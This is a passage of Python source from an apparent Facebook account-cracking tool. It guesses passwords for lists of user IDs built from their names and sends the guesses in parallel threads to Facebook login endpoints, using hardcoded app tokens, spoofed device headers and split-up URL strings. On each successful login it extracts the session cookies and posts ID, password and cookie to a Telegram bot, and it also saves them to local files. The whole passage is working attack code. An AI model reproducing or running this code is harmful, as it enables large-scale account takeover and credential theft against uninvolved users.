            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':ua,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://b-'+'api.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f"{cid} | {pas} | {coki}")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass


def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/zar0.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
    with ThreadPool(max_workers=30) as zar0:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                zar0.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                zar0.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                zar0.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                zar0.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                zar0.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = mls1()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{advertiser_id}",
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = [
                "Host: graph.facebook.com",
                f"x-fb-connection-bandwidth: {cban}",
                f"x-fb-sim-hni: {netheni}",
                f"x-fb-net-hni: {simheni}",
                "x-fb-connection-quality: EXCELLENT",
                "content-type: application/x-www-form-urlencoded",
                "x-fb-http-engine: Liger",
                f"User-Agent: {user_agent.encode('utf-8')}",
            ]
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {cookie} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls2()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {cookie} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls3()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {cookie} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls4()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {cookie} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls5()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent.encode('utf-8')}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{cookie}")
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {cookie} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            warna = random.choice(my_color)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
